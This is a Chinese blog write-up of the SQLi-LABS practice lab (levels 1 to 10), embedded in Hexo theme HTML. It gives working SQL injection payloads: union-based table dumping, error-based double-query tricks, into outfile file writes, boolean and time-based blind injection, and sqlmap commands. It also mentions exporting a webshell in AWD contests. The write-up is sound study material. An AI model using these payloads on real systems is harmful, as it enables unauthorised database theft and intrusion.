@@ -1,0 +1,1884 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="总结sqli labs的注入思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi LABS wp">
+<meta property="og:url" content="http://yoursite.com/2018/10/24/SQLi-LABS-wp/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="总结sqli labs的注入思路">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/9FknFdd.png">
+<meta property="og:image" content="https://i.imgur.com/sfwbRbt.png">
+<meta property="og:image" content="https://i.imgur.com/kyI0eKM.jpg">
+<meta property="og:image" content="https://i.imgur.com/ALZ5j0z.png">
+<meta property="og:image" content="https://i.imgur.com/TWtbglx.png">
+<meta property="og:image" content="https://i.imgur.com/TxCyXRt.png">
+<meta property="og:image" content="https://i.imgur.com/bxpvDig.jpg">
+<meta property="og:image" content="https://i.imgur.com/METIRKL.jpg">
+<meta property="og:image" content="https://i.imgur.com/itCJBP3.png">
+<meta property="og:image" content="https://i.imgur.com/N8MOEhO.png">
+<meta property="og:image" content="https://i.imgur.com/ixdJOFu.png">
+<meta property="og:image" content="https://i.imgur.com/J1lZWZJ.png">
+<meta property="og:image" content="https://i.imgur.com/tVkRJz2.png">
+<meta property="og:image" content="https://i.imgur.com/La3hSaH.png">
+<meta property="og:image" content="https://i.imgur.com/s38ZaTR.png">
+<meta property="og:image" content="https://i.imgur.com/M7kNNW4.png">
+<meta property="og:image" content="https://i.imgur.com/b1rXzZt.png">
+<meta property="og:image" content="https://i.imgur.com/kzhznTt.png">
+<meta property="og:image" content="https://i.imgur.com/nPiEmqv.png">
+<meta property="og:image" content="https://i.imgur.com/o91uniC.png">
+<meta property="og:image" content="https://i.imgur.com/T4VqPdS.jpg">
+<meta property="og:image" content="https://i.imgur.com/NtSKe7O.jpg">
+<meta property="og:image" content="https://i.imgur.com/aaeDOVR.png">
+<meta property="og:image" content="https://i.imgur.com/pdGGKsc.jpg">
+<meta property="og:image" content="https://i.imgur.com/QyTmq5E.png">
+<meta property="og:image" content="https://i.imgur.com/eiGYxu3.png">
+<meta property="og:image" content="https://i.imgur.com/gsyYYbw.jpg">
+<meta property="og:image" content="https://i.imgur.com/ETQR3tu.jpg">
+<meta property="og:image" content="https://i.imgur.com/qFz7cD9.jpg">
+<meta property="og:image" content="https://i.imgur.com/oMYdiCK.png">
+<meta property="og:image" content="https://i.imgur.com/eBl4hiz.jpg">
+<meta property="og:image" content="https://i.imgur.com/mCKBLkX.png">
+<meta property="og:image" content="https://i.imgur.com/RZkTswx.png">
+<meta property="og:image" content="https://i.imgur.com/WdSNSeU.png">
+<meta property="og:image" content="https://i.imgur.com/3CtKSqH.png">
+<meta property="og:image" content="https://i.imgur.com/00DmWs7.jpg">
+<meta property="og:image" content="https://i.imgur.com/n5t95OK.png">
+<meta property="og:image" content="https://i.imgur.com/EP65VYS.png">
+<meta property="og:image" content="https://i.imgur.com/1dFEwzT.png">
+<meta property="og:image" content="https://i.imgur.com/eAJ6vpw.png">
+<meta property="og:image" content="https://i.imgur.com/31q2k6g.png">
+<meta property="og:image" content="https://i.imgur.com/0UrcjRq.png">
+<meta property="og:image" content="https://i.imgur.com/YQXi6MQ.png">
+<meta property="og:image" content="https://i.imgur.com/5iPvxJV.png">
+<meta property="og:image" content="https://i.imgur.com/47Ek5ct.png">
+<meta property="og:image" content="https://i.imgur.com/bq2J1Zk.png">
+<meta property="og:image" content="https://i.imgur.com/tei5BE0.png">
+<meta property="og:image" content="https://i.imgur.com/a4vgygX.png">
+<meta property="og:image" content="https://i.imgur.com/MlQEUiT.png">
+<meta property="og:image" content="https://i.imgur.com/GVIiEZQ.png">
+<meta property="og:image" content="https://i.imgur.com/AGTG4Ms.png">
+<meta property="og:image" content="https://i.imgur.com/ctFOLJd.png">
+<meta property="og:updated_time" content="2019-03-26T09:25:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi LABS wp">
+<meta name="twitter:description" content="总结sqli labs的注入思路">
+<meta name="twitter:image" content="https://i.imgur.com/9FknFdd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/24/SQLi-LABS-wp/">
+
+
+
+
+
+  <title>SQLi LABS wp | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/24/SQLi-LABS-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi LABS wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-24T22:06:07+08:00">
+                2018-10-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-03-26T17:25:58+08:00">
+                2019-03-26
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/24/SQLi-LABS-wp/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/10/24/SQLi-LABS-wp/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总结sqli labs的注入思路</p>
+<a id="more"></a>
+<ul>
+<li>查询时要判断是否要将主查询回显数据置空！</li>
+<li>GET型注入时，浏览器自动将单引号<code>&#39;</code>url编码，但没有将井号符#编码，查询时需要自己将<code>#</code>url编码成<code>%23</code>,或用<code>--+</code></li>
+</ul>
+<p>可在题的php文件中做修改，将查询的sql语句输出出来</p>
+<hr>
+<p>2019/3/14更新，重新整理一下，以便以后学习</p>
+<p>一些关键词：</p>
+<ul>
+<li>union : 将两个或两个以上<code>select</code>语句的查询结果合并</li>
+<li>order by num : 将数据以第num列进行排序，默认按照首字符的16进制进行排序</li>
+<li>infomation_schema : mysql下的系统数据库，存储着所有数据库相关的信息；一般在注入时使用的表有：<ul>
+<li>tables : 存储着数据库中的表名</li>
+<li>columns : 存储着表中的列字段名</li>
+<li>schemata : 存储着所有数据库名   </li>
+</ul>
+</li>
+</ul>
+<p>与information_schema配合使用的关键字有：</p>
+<ul>
+<li>table_name : 表名</li>
+<li>column_name : 列名</li>
+<li>table_schema : 当前数据库名</li>
+<li>schema_name : 数据库名</li>
+</ul>
+<p>一些函数：</p>
+<ul>
+<li>database() : 当前数据库</li>
+<li>group_concat() : 将查询到的多行内容集合到一行显示</li>
+<li>sleep(num) : 睡眠num秒</li>
+<li>benchmark(num, func()) : 将函数func执行num次</li>
+<li>concat() : 连接字符串</li>
+<li>version()或@@version ：MySQL 版本 </li>
+<li>user() ：数据库用户名 </li>
+<li>@@datadir ：数据库路径 </li>
+<li>@@version_compile_os ：操作系统版本 </li>
+</ul>
+<h2 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi LABS"></a>SQLi LABS</h2><h3 id="1-单字符注入"><a href="#1-单字符注入" class="headerlink" title="1.单字符注入"></a>1.单字符注入</h3><p><img src="https://i.imgur.com/9FknFdd.png" alt></p>
+<p>输入</p>
+<pre><code>id=1&apos;</code></pre><p>出现</p>
+<p><img src="https://i.imgur.com/sfwbRbt.png" alt></p>
+<p>在’1’后面多出了一个单引号，则为字符型注入</p>
+<p>查询字段列数：</p>
+<pre><code>order by 1%23
+
+# order by num即为以第num列进行排序   </code></pre><p>当order by 4时出现错误，即主查询有三个字段，联合查询也必须有三个查询字段</p>
+<p>当前数据库（使用database()函数）</p>
+<pre><code>union select 1,2,database()%23</code></pre><p>得到当前数据库为：security</p>
+<p>一些知识：</p>
+<pre><code>information_schema 相当于一个数据库
+这个数据库有一张tables表，有一张columns的表，其中：
+tables这张表有table_name(表名)、table_schema(表所在数据库名)这两个字段
+columns这张表有column_name(字段名)这个字段</code></pre><p>当前数据库中的表</p>
+<pre><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;%23</code></pre><p>or（直接用select database()指定为当前数据库）</p>
+<pre><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())%23</code></pre><p>得到表：emails,referers,uagents,users</p>
+<p>其中表users的字段</p>
+<pre><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;%23</code></pre><p>得到字段名后，获取字段下的数据</p>
+<pre><code>union select 1,2,group_concat(id) from users%23</code></pre><h3 id="2-数字型注入"><a href="#2-数字型注入" class="headerlink" title="2.数字型注入"></a>2.数字型注入</h3><p>输入</p>
+<pre><code>id=1&apos;</code></pre><p><img src="https://i.imgur.com/kyI0eKM.jpg" alt></p>
+<p>输入的id没有出现错误，而在LIMIT 0,1前面出现了一个单引号，则说明为数字型注入</p>
+<p>则输入语句格式为(与第一题字符型输入类似)</p>
+<pre><code>id=0 union select......%23</code></pre><h3 id="3-加括号的注入"><a href="#3-加括号的注入" class="headerlink" title="3.加括号的注入"></a>3.加括号的注入</h3><p>输入</p>
+<pre><code>id=1&apos;</code></pre><p>出现</p>
+<p><img src="https://i.imgur.com/ALZ5j0z.png" alt></p>
+<p>可推测出输入的id位于一个括号内</p>
+<p>则需要在单引号’后加半个括号)来闭合前面的半个括号(</p>
+<p>注入时输入</p>
+<pre><code>id=0&apos;) union......%23</code></pre><p>即可</p>
+<p>验证：</p>
+<p><img src="https://i.imgur.com/TWtbglx.png" alt></p>
+<h3 id="4-双引号的字符型注入-括号"><a href="#4-双引号的字符型注入-括号" class="headerlink" title="4.双引号的字符型注入+括号"></a>4.双引号的字符型注入+括号</h3><p>输入</p>
+<pre><code>id=1&apos;</code></pre><p><img src="https://i.imgur.com/TxCyXRt.png" alt></p>
+<p>发现正常显示</p>
+<p>除了单引号，括号、中文单引号等都试了，发现页面没有报错</p>
+<p>试了下双引号，成功引起报错</p>
+<p><img src="https://i.imgur.com/bxpvDig.jpg" alt></p>
+<p>还发现双引号后面有半个括号，则需要将括号闭合</p>
+<p>注入时输入</p>
+<pre><code>0&quot;) union ......%23</code></pre><p>即可</p>
+<p>验证</p>
+<p><img src="https://i.imgur.com/METIRKL.jpg" alt></p>
+<p>php内的语句为</p>
+<pre><code>$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;
+$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></pre><p>注：<br>若输入</p>
+<pre><code>id=1&apos;</code></pre><p>则查询语句会成为</p>
+<pre><code>SELECT * FROM users WHERE id=(&quot;1&apos;&quot;) LIMIT 0,1&quot;</code></pre><p>那么问题来了，为什么仍然会查询，不会报错呢？</p>
+<p>查看资料，书上有这样一句话：</p>
+<blockquote>
+<p>严格的说，数字也是字符串，只不过在查询数据为数字时不会加引号</p>
+</blockquote>
+<p>我测试了一下</p>
+<p><img src="https://i.imgur.com/itCJBP3.png" alt></p>
+<p>即sql也可以自动转化数据类型</p>
+<h3 id="5-双查询注入"><a href="#5-双查询注入" class="headerlink" title="5.双查询注入"></a>5.双查询注入</h3><p>这个题弄了好久，与前几题相比需要学习一些新的知识</p>
+<pre><code>concat()：把两个字符串连接到一起
+
+rand()：是一个随机函数，返回大于0，小于1的随机值
+
+floor():将小数向下取整，如floor(0.5)的值为0，floor(rand())的值为0
+
+count(*): 返回表中的记录数(属于聚合函数)
+
+select id as newName : 将id起了一个新名字返回回来
+
+group by : 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。
+(与order by 很像，默认上下顺序：数字从小到大，字母按字母表顺序)</code></pre><p>先进行测试：</p>
+<p>数据库名：test1</p>
+<p>表users中的数据：</p>
+<p><img src="https://i.imgur.com/N8MOEhO.png" alt></p>
+<p>使用双查询：</p>
+<p><img src="https://i.imgur.com/ixdJOFu.png" alt></p>
+<p>即查询时先进行concat中的语句：</p>
+<pre><code>select database() 返回test1
+floor(rand()*2) 随机返回0，或1</code></pre><p>经过concat()连接后就成为了test10(随机返回0)</p>
+<p>多查询几次，发现还有另外三种情况：</p>
+<p><img src="https://i.imgur.com/J1lZWZJ.png" alt></p>
+<p><img src="https://i.imgur.com/tVkRJz2.png" alt></p>
+<p><img src="https://i.imgur.com/La3hSaH.png" alt></p>
+<p>由于原表数据有两行，因此只返回了两行数据，四种情况</p>
+<pre><code>1.test10 test11;
+2.test11 test10;
+3.test11 test11;
+4.test10 test10;</code></pre><p>就相当于</p>
+<pre><code>select 1 from users;  会返回两行1
+select 2 from users;  会返回两行2</code></pre><p>但由于子查询（concat()中的查询)是个随机数，因此会将随机的查询的结果整合并返回(循环查询并插入)</p>
+<p>此外，可以用as newName的形式将返回的结果新起一个字段名：</p>
+<p><img src="https://i.imgur.com/s38ZaTR.png" alt></p>
+<p>使用group by:</p>
+<p>表users数据：</p>
+<p><img src="https://i.imgur.com/M7kNNW4.png" alt></p>
+<p>分组：</p>
+<p><img src="https://i.imgur.com/b1rXzZt.png" alt></p>
+<p>注意到了根据username进行分组时，重复的数据只显示了一个</p>
+<p>这是怎样执行的呢？</p>
+<p>看了一篇大佬的博客，说使用group by子句时，相当于事先创建了一个虚拟的表，之后再进行select查询</p>
+<pre><code>group by username</code></pre><p>即以username为一个字段，相同的值合并为一行</p>
+<p>如，当前表数据为：</p>
+<p><img src="https://i.imgur.com/kzhznTt.png" alt></p>
+<p>则group by username的虚拟表数据为</p>
+<pre><code>id  username       password
+
+5   biubiubiu      asdfg
+4                  adfdf1 
+
+1   gtfly          66666
+3                  1234321</code></pre><p>即一行里面id与password有两个数据，用聚合函数sum函数（计算数值和）验证：</p>
+<p><img src="https://i.imgur.com/nPiEmqv.png" alt></p>
+<p>现在，测试这条语句：</p>
+<pre><code>select count(*) from users group by floor(rand()*2);</code></pre><p>测试发现有一定几率会出错：</p>
+<p><img src="https://i.imgur.com/o91uniC.png" alt></p>
+<p>为什么会这样呢？</p>
+<p>上面说了，执行group by之前会创建一个虚拟表</p>
+<pre><code>group_key    count(*)
+
+...          ...</code></pre><p>group_key为主键</p>
+<p>查询第一条数据，floor(rand()*)会执行一次，假设返回的值为0，发现虚拟表中的主键没有0这个值，则会准备插入这个值，插入时会再执行一次，假设第二次返回1，则此时虚拟表为：</p>
+<pre><code>group_key    count(*)
+
+1            1</code></pre><p>查询第二条数据，floor(rand()*2)会执行一次，假设返回的值为1，发现虚拟表中的主键有这个值，则不会再执行一次，直接插入，此时虚拟表为：</p>
+<pre><code>group_key    count(*)
+
+1            2</code></pre><p>查询第三条数据，floor(rand()*2)会执行一次，假设返回的值为0，发现虚拟表中的主键没有这个值，则准备插入，会再执行一次，假设第二次返回的值是1，但虚拟表已经存在1这个主键了，则会报错</p>
+<p>参考链接（感谢大佬）</p>
+<pre><code>https://www.cnblogs.com/dplearning/p/7355595.html</code></pre><p>回到这个题</p>
+<p><img src="https://i.imgur.com/T4VqPdS.jpg" alt></p>
+<p>输入</p>
+<pre><code>?id=1&apos;</code></pre><p>会报错，进行单引号注入，使用order by语句正常得出有三个字段，但是进行联合查询时却总显示</p>
+<p><img src="https://i.imgur.com/NtSKe7O.jpg" alt></p>
+<p>看了下源代码，发现根本没有查询成功后的输出语句，只会输出报错的语句</p>
+<p><img src="https://i.imgur.com/aaeDOVR.png" alt></p>
+<p>但可以利用双查询注入出现的重复键值的报错来获取信息，运用上述知识</p>
+<pre><code>?id=0&apos;union select 1,count(*),concat((select database()),floor(rand()*2)) as a from 
+information_schema.tables group by a%23;</code></pre><p>因为具有随机性，多刷新几下</p>
+<p><img src="https://i.imgur.com/pdGGKsc.jpg" alt></p>
+<p>得到数据库名security</p>
+<p>之后获取表，发现</p>
+<pre><code>?id=0&apos;union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),floor(rand()*2)) as a from 
+information_schema.tables group by a%23;</code></pre><p>这条语句不起作用</p>
+<p>为什么呢？测试了一下，发现果然这样的注入方式有问题</p>
+<p><img src="https://i.imgur.com/QyTmq5E.png" alt></p>
+<p>group by 后面为表原字段名时，group_concat将分组后的虚拟表的每行数据整合并正常返回</p>
+<p><img src="https://i.imgur.com/eiGYxu3.png" alt></p>
+<p>换了一条语句，使用limit a,b(返回从a+1开始的b条的数据)，逐个查询</p>
+<pre><code>?id=0&apos;union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),floor(rand()*2)) as a from 
+information_schema.tables group by a%23;</code></pre><p><img src="https://i.imgur.com/gsyYYbw.jpg" alt></p>
+<p>可以得到第一个表的名，不断更换limit的值便可得出所有表……</p>
+<h3 id="6-双引号双查询注入"><a href="#6-双引号双查询注入" class="headerlink" title="6.双引号双查询注入"></a>6.双引号双查询注入</h3><p>输入单引号不报错，用双引号发现报错了，注入方式同第五题</p>
+<h3 id="7-导出注入"><a href="#7-导出注入" class="headerlink" title="7.导出注入"></a>7.导出注入</h3><p>构造</p>
+<pre><code>?id=1</code></pre><p><img src="https://i.imgur.com/ETQR3tu.jpg" alt></p>
+<p>构造</p>
+<pre><code>?id=1&apos;</code></pre><p>出错</p>
+<p><img src="https://i.imgur.com/qFz7cD9.jpg" alt></p>
+<p>再构造</p>
+<pre><code>?id=1&apos;%23</code></pre><p>发现仍出错，继续构造</p>
+<pre><code>?id=1&apos;)%23  出错
+?id=1&apos;))%23 不出错</code></pre><p>则可根据页面是否出现’You are in…’进行盲注(参考第8题)</p>
+<p>但这道题目的不是让用盲注做的，而是用导出文件的方法来做，即将数据信息导出到一个文件中</p>
+<p>参考：</p>
+<pre><code>https://mp.weixin.qq.com/s/ehrsRA5AReVkOUm-ELw3cw</code></pre><p>句式：</p>
+<pre><code>select ... from ... into outfile 文件详细路径名;</code></pre><p>先用order by得到主查询序列，为3</p>
+<p>再构造</p>
+<pre><code>?id=1&apos;)) union select database() into outfile &apos;C:/datas/test.txt&apos;%23</code></pre><p>这时页面仍显示错误，但已经导出成功了</p>
+<p><img src="https://i.imgur.com/oMYdiCK.png" alt></p>
+<p>…</p>
+<p>在awd攻防中，可以利用导出一句话到一个php文件来拿到shell</p>
+<h3 id="8-布尔型盲注"><a href="#8-布尔型盲注" class="headerlink" title="8.布尔型盲注"></a>8.布尔型盲注</h3><p>输入</p>
+<pre><code>?id=1</code></pre><p>显示‘you are in’，但在1后面加一个单引号，不会报错，什么都不显示(第五、六题会报错)</p>
+<p><img src="https://i.imgur.com/eBl4hiz.jpg" alt></p>
+<p>然后在1’后面加上%23，又显示了‘you are in’，说明这是单引号注入类型，但是不会将错误语句输出出来</p>
+<p>此时，使用双查询语句，要么会显示‘you are in’，要么什么都不显示(因为有随机性)</p>
+<p>则要进行盲注了</p>
+<p>不会显示报错语句，那盲注是什么原理来获取信息呢？</p>
+<p>即：不断使用查询语句，根据页面是否显示‘you are in’来判断查询语句是否正确，再根据查询的内容即可获取信息</p>
+<p>需要了解一些知识：</p>
+<pre><code>sql:
+length(str)：返回str字符串的长度。 
+substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回(pos从1开始)
+ascii(str)：返回字符的ASCll的值
+
+python: 
+chr(str): 返回ascll码对应的字符 </code></pre><p>这里用到了ascii()进行判断(c后面两个字母是i而不是l，第一次发现2333)，因为数据库的名或字段名不一定全都是字母</p>
+<p>要获取数据库的第一位(注意！！！由于用到了and，此时id不能为0或其他无回显的值，否则无论怎样注入，页面都不会有显示的值)</p>
+<pre><code>?id=1&apos;and ascii(substr((select database()),1,1))=num</code></pre><p>或(将and改为or即需要将id值置为0)</p>
+<pre><code>?id=0&apos;or ascii(substr((select database()),1,1))=num</code></pre><p>由于ascii有128个(0-127)，则不断更改num的值，如果查询正确，即页面显示‘you are in’，即可得到数据库名的第一位</p>
+<p>如，当num为115时(对应为’s’)，页面显示‘you are in’，即可推断出数据库第一位为’s’</p>
+<p>但由于num的范围大，不能用手一个个测试，因此可以用python写脚本的方法，运行脚本逐个获取各个位的值</p>
+<p>脚本跑的太慢了，用sqlmap试试</p>
+<pre><code>sqlmap.py -u &quot;网址&quot; --current-db  -D 数据库名 --tables -T 表名 --columns -C 列名 --dump</code></pre><p><img src="https://i.imgur.com/mCKBLkX.png" alt></p>
+<p><img src="https://i.imgur.com/RZkTswx.png" alt></p>
+<p><img src="https://i.imgur.com/WdSNSeU.png" alt></p>
+<p>盲注的过程真的太慢了。。。</p>
+<h3 id="9-基于时间的盲注"><a href="#9-基于时间的盲注" class="headerlink" title="9.基于时间的盲注"></a>9.基于时间的盲注</h3><p>上面的基于布尔型的盲注是根据页面是否显示”You are in”查询的信息是否正确，但如果查询的信息错误但页面仍显示”You are in”呢？看这道题的代码</p>
+<p><img src="https://i.imgur.com/3CtKSqH.png" alt></p>
+<p>这时候，就要用到：</p>
+<pre><code>sleep(5) 延迟5秒
+if(A,B,C) 如果表达式A成立，则返回B，否则返回C</code></pre><p>构造</p>
+<pre><code>?id=1 and if(length(database())&gt;5,sleep(5),0)</code></pre><p>如果数据库名长度大于5，则会执行sleep(5)，进行测试</p>
+<p><img src="https://i.imgur.com/00DmWs7.jpg" alt></p>
+<p>可以看到执行了7秒多，但将&gt;5改成&lt;5</p>
+<p><img src="https://i.imgur.com/n5t95OK.png" alt></p>
+<p>发现执行了1秒多，说明数据库长度大于5</p>
+<p>则可以根据页面返回时间来判断查询语句是否正确获取信息，用sqlmap获取：</p>
+<pre><code>sqlmap.py -u &quot;http://127.0.0.1/labs/Less-9/?id=1&quot; --current-db</code></pre><p><img src="https://i.imgur.com/EP65VYS.png" alt></p>
+<p>…</p>
+<h3 id="10-基于时间的盲注-双引号"><a href="#10-基于时间的盲注-双引号" class="headerlink" title="10.基于时间的盲注-双引号"></a>10.基于时间的盲注-双引号</h3><p>将第九题的单引号改为双引号即可注入</p>
